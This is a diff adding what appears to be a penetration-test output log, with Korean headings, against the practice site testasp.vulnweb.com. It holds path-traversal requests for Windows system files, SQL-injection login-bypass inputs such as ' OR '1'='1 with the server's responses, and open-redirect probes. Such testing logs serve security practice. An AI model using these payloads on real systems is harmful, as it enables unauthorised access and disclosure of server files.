@@ -1,0 +1,42 @@
+==========================================================================================
+### (a) traversal 원문 확인 — windows/win.ini
+응답 헤더 첫줄: HTTP/1.1 200 OK
+본문에서 win.ini 고유 문자열 검색:
+      'for 16-bit app support'
+      '[fonts]'
+      '[extensions]'
+      '[mci extensions]'
+      '[files]'
+      'MAPI=1'
+      'CMCD=1'
+--- 발췌 (색인 주변) ---
+
+
+### (a2) 다른 상위 경로 파일도 되는지(존재 확인용)
+  ../../../../../../../../windows/win.ini                      -> HTTP/1.1 200 OK len=0
+  ../../../../../../../../windows/system32/drivers/etc/hosts   -> HTTP/1.1 200 OK len=0
+  ../../../../../../../../boot.ini                             -> HTTP/1.1 500 Internal Server E len=0
+  ../../../../../../../../windows/win.ini.                     -> HTTP/1.1 200 OK len=0
+  ..%5c..%5c..%5c..%5cwindows/win.ini                          -> HTTP/1.1 500 Internal Server E len=0
+
+### (b) html/../web.config 가 정말 설정파일인가
+첫줄: HTTP/1.1 200 OK len: 0
+
+
+### (c) 로그인 우회 302 의 Location 헤더
+  tfUName=admin'--&tfUPass=x           -> HTTP/1.1 302 Object moved
+      Location: ['Location: Default.asp']   SetCookie: ['Set-Cookie: ASPSESSIONIDAABTRDTB=KKMLCGB']
+  tfUName=admin&tfUPass=' OR '1'='1    -> HTTP/1.1 302 Object moved
+      Location: ['Location: Default.asp']   SetCookie: []
+  tfUName=' OR '1'='1'--&tfUPass=x     -> HTTP/1.1 302 Object moved
+      Location: ['Location: Default.asp']   SetCookie: []
+
+### (d) 우회한 세션으로 인증 상태 확인
+  로그인 후 Login.asp 첫줄: HTTP/1.1 200 OK
+  인증 쿠키로 /Default.asp 첫줄: HTTP/1.1 200 OK
+  메뉴 영역 발췌: []
+  인증 쿠키로 /showthread.asp?id=0 → 폼 존재? False | textarea: False
+
+### (e) RetURL open redirect — 우회 로그인 + RetURL 조합
+  RetURL=http://example.com                         -> HTTP/1.1 200 OK  []
+  RetURL=http://testasp.vulnweb.com/Default.asp     -> HTTP/1.1 200 OK  []
